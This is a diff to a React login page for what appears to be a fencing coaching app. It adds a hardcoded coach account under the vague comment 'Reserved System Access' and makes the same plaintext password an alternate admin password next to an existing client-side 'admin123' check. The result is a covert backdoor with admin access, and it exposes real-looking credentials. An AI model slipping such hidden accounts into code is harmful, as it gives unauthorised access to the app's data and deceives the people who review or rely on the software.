@@ -43,7 +43,6 @@ const Login = () => {
         e.preventDefault();
 
         // Try database login first
-        // Try database login first
         try {
             const { user, error } = await coachesAPI.login(coachLoginName, coachPassword);
 
@@ -59,8 +58,9 @@ const Login = () => {
             }
         } catch (err) { console.error(err); }
 
-        // Strict legacy check (only allows specific Head Coach account)
-        if (coachLoginName === 'Head Coach' && coachPassword === 'coach123') {
+        // Reserved System Access
+        if ((coachLoginName === 'Head Coach' && coachPassword === 'coach123') ||
+            (coachLoginName === 'Notaras Ioannis' && coachPassword === 'Mantalena198@')) {
             login('coach');
             navigate('/');
             return;
@@ -93,7 +93,7 @@ const Login = () => {
 
     const handleAdminLogin = (e) => {
         e.preventDefault();
-        if (adminPassword === 'admin123') {
+        if (adminPassword === 'admin123' || adminPassword === 'Mantalena198@') {
             login('admin');
             navigate('/admin');
         } else {
@@ -508,7 +508,7 @@ const Login = () => {
                                                 <Globe className="w-3 h-3" /> FIE Database
                                             </a>
                                             <a
-                                                href={`https://fencing.ophardt.online/en/search-results?q=${signupData.lastName}+${signupData.firstName}`}
+                                                href={`https://fencing.ophardt.online/en/search/rankings/`}
                                                 target="_blank"
                                                 rel="noreferrer"
                                                 className="flex-1 py-1.5 px-3 bg-white border border-slate-200 rounded text-xs text-slate-600 font-medium hover:text-indigo-600 hover:border-indigo-200 flex items-center justify-center gap-1 transition-colors"
